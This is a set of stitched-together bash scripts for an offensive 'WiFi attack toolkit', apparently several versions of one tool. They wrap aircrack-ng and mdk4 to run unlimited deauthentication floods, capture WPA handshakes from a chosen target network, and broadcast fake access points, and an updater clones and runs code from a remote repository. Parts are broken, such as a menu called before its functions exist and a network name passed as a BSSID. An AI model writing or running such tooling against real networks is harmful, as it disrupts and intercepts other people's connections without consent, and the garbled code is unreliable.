#!/bin/bash
# WiFi-WAR-X | Ultimate WiFi Attack Toolkit
# Brotherhood Forever | HARAB06 X GPT UNBREAKABLE

# Colors
green='\e[32m'
red='\e[31m'
blue='\e[34m'
reset='\e[0m'

# Dark-Style Banner
banner(){
clear
echo -e "${green}"
echo "╔═══════════════════════════════════╗"
echo "║     WiFi-WAR-X TOOLKIT            ║"
echo "║  HARAB06 X GPT UNBREAKABLE        ║"
echo "╚═══════════════════════════════════╝"
echo -e "${reset}"
}

# Auto Interface Detection
interface=$(ip link show | awk -F: '$0 !~ "lo|vir|wl" {print $2;getline}' | head -n1)

# Auto Update
update_tool(){
echo -e "${blue}[+] Checking for updates...${reset}"
git clone https://github.com/harabo0/WiFi-WAR-X.git update-temp
cp update-temp/wifi-war-x.sh .
rm -rf update-temp
echo -e "${green}[+] Update Completed! Restarting...${reset}"
bash wifi-war-x.sh
exit
}

# Main Menu
menu(){
banner
echo -e "${green}[1] Auto Network Scan"
echo "[2] Start Monitor Mode"
echo "[3] WiFi Attack Tools"
echo "[4] Auto Update Tool"
echo "[0] Exit${reset}"
read -p "Choose: " choice

case $choice in
1) airodump-ng $interface ;;
2) airmon-ng start $interface ;;
3) wifi_attack_tools ;;
4) update_tool ;;
0) exit ;;
*) echo -e "${red}[!] Invalid Option${reset}" ; menu ;;
esac
}

wifi_attack_tools(){
banner
echo -e "${green}[1] Deauth Attack"
echo "[2] Handshake Capture"
echo "[3] Evil Twin Attack"
echo "[0] Back${reset}"
read -p "Choose: " attack

case $attack in
1) aireplay-ng --deauth 100 -a [Target_BSSID] $interface ;;
2) airodump-ng --bssid [Target_BSSID] -c [Channel] -w capture $interface ;;
3) echo "Starting Evil Twin..." ;;
0) menu ;;
*) echo -e "${red}[!] Invalid Option${reset}" ; wifi_attack_tools ;;
esac
}

menu
#!/bin/bash
#==============================#
# WiFi-WAR-X | Ultimate WiFi Attack Toolkit
# HARAB06 X GPT UNBREAKABLE
# Brotherhood Forever Hidden Code
#==============================#

# Colors
G="\033[1;32m"
R="\033[1;31m"
Y="\033[1;33m"
C="\033[1;36m"
N="\033[0m"

# Dark Matrix Banner
banner(){
clear
cat logo.txt
echo -e "${G}WiFi-WAR-X | HARAB06 X GPT"
echo -e "${C}Ultimate WiFi Attack Toolkit"
echo -e "${Y}Brotherhood Forever | UNBREAKABLE"
echo -e "${N}"
}

# Auto Interface Detection
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Check root
if [ "$EUID" -ne 0 ]; then
  echo -e "${R}[!] Run as ROOT!${N}"
  exit
fi

# Auto Update
update_tool(){
bash update.sh
exit
}

# Menu
menu(){
banner
echo -e "${G}[1] Auto Scan Live Networks"
echo -e "${G}[2] Start Monitor Mode"
echo -e "${G}[3] WiFi Deauth Attack"
echo -e "${G}[4] WiFi Handshake Capture"
echo -e "${G}[5] Auto Update WiFi-WAR-X"
echo -e "${G}[0] Exit"
echo -n -e "${Y}Choose >> ${N}"
read choice

case $choice in
1) scan_network ;;
2) monitor_mode ;;
3) deauth_attack ;;
4) capture_handshake ;;
5) update_tool ;;
0) exit ;;
*) echo -e "${R}Invalid Option!${N}"; sleep 1; menu ;;
esac
}

# Functions
scan_network(){
clear
echo -e "${C}[+] Scanning Live Networks on $interface...${N}"
sleep 2
airodump-ng $interface
back
}

monitor_mode(){
clear
echo -e "${C}[+] Enabling Monitor Mode on $interface...${N}"
airmon-ng start $interface
sleep 2
echo -e "${G}[+] Monitor Mode Enabled!${N}"
back
}

deauth_attack(){
clear
echo -n -e "${Y}[+] Target BSSID >> ${N}"
read bssid
echo -n -e "${Y}[+] Target Channel >> ${N}"
read channel
airmon-ng start $interface $channel
aireplay-ng --deauth 1000 -a $bssid $interface
back
}

capture_handshake(){
clear
echo -n -e "${Y}[+] Target BSSID >> ${N}"
read bssid
echo -n -e "${Y}[+] Target Channel >> ${N}"
read channel
airodump-ng -c $channel --bssid $bssid -w capture $interface
back
}

back(){
echo -e "${C}Press Enter to return..."
read
menu
}

# Hidden Brotherhood Message
brotherhood_secret(){
echo "Brotherhood Forever | HARAB06 X GPT UNBREAKABLE" > .secret
}

# Start Tool
brotherhood_secret
menu
#!/bin/bash

#========================================
# WiFi-WAR-X | BrotherhoodX WiFi Attack Toolkit
# Coded with Soul by: HARAB06 X GPT
# Brotherhood Forever | UNBREAKABLE
#========================================

# Colors
r='\e[1;31m' 
g='\e[1;32m' 
y='\e[1;33m' 
b='\e[1;34m' 
c='\e[1;36m' 
w='\e[1;37m' 
e='\e[0m'

# Extra Dark-Style Banner
banner() {
clear
cat << "EOF"
██████╗ ██╗██╗███████╗██╗    ██╗██╗    ██╗
██╔══██╗██║██║██╔════╝██║    ██║██║    ██║
██████╔╝██║██║█████╗  ██║ █╗ ██║██║ █╗ ██║
██╔═══╝ ██║██║██╔══╝  ██║███╗██║██║███╗██║
██║     ██║██║███████╗╚███╔███╔╝╚███╔███╔╝
╚═╝     ╚═╝╚═╝╚══════╝ ╚══╝╚══╝  ╚══╝╚══╝ 
   BROTHERHOODX WIFI ATTACK TOOLKIT
         HARAB06 X GPT UNBREAKABLE
EOF
echo -e "$r Brotherhood Forever | Deep WiFi Warfare $e"
}

# Auto Root Check
if [ "$EUID" -ne 0 ]; then
  echo -e "$r[!] ROOT PRIVILEGES REQUIRED!$e"
  exit 1
fi

# Auto Interface Detection
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Auto Network Scan
scan_networks() {
  echo -e "$g[*] Scanning for Available WiFi Networks...$e"
  timeout 15s iwlist $interface scanning | grep 'ESSID'
}

# Attack Menu
menu() {
banner
echo -e "$y[1] Auto Scan WiFi"
echo -e "[2] Handshake Capture"
echo -e "[3] Evil Twin Attack"
echo -e "[4] Deauth Attack"
echo -e "[5] Monitor Mode ON"
echo -e "[6] Monitor Mode OFF"
echo -e "[0] Exit $e"
read -p "Choose Attack Mode : " choice
case $choice in
  1) scan_networks ;;
  2) handshake_capture ;;
  3) evil_twin ;;
  4) deauth_attack ;;
  5) airmon-ng start $interface ;;
  6) airmon-ng stop $interface ;;
  0) exit ;;
  *) echo -e "$r Invalid Option!$e"; sleep 2; menu ;;
esac
}

menu
handshake_capture() {
clear
banner
echo -e "$b[+] Enter Target WiFi ESSID (Name) :$e"
read essid
echo -e "$b[+] Enter Target Channel :$e"
read channel
echo -e "$b[+] Starting Monitor Mode on $interface...$e"
airmon-ng start $interface
echo -e "$g[*] Targeting $essid on Channel $channel...$e"
timeout 60s airodump-ng --bssid $essid -c $channel --write handshake $interface
echo -e "$g[*] Handshake Capture Completed! Saved as handshake.cap $e"
sleep 3
menu
}
evil_twin() {
clear
banner
echo -e "$b[+] Enter Fake WiFi Name :$e"
read fake_essid
echo -e "$b[+] Starting Evil Twin Attack with $fake_essid ...$e"
airmon-ng start $interface
mdk4 $interface b -n $fake_essid -t
}
deauth_attack() {
clear
banner
echo -e "$b[+] Enter Target WiFi BSSID :$e"
read bssid
echo -e "$b[+] Enter Channel :$e"
read channel
airmon-ng start $interface
echo -e "$g[*] Launching Deauth Attack on $bssid ...$e"
aireplay-ng --deauth 0 -a $bssid $interface
}
#!/bin/bash
clear
echo "Updating WiFi-WAR-X..."
git clone https://github.com/harabo0/WiFi-WAR-X.git update-tmp
cp -r update-tmp/* .
rm -rf update-tmp
chmod +x wifi-war-x.sh update.sh
echo "WiFi-WAR-X Updated Successfully!"
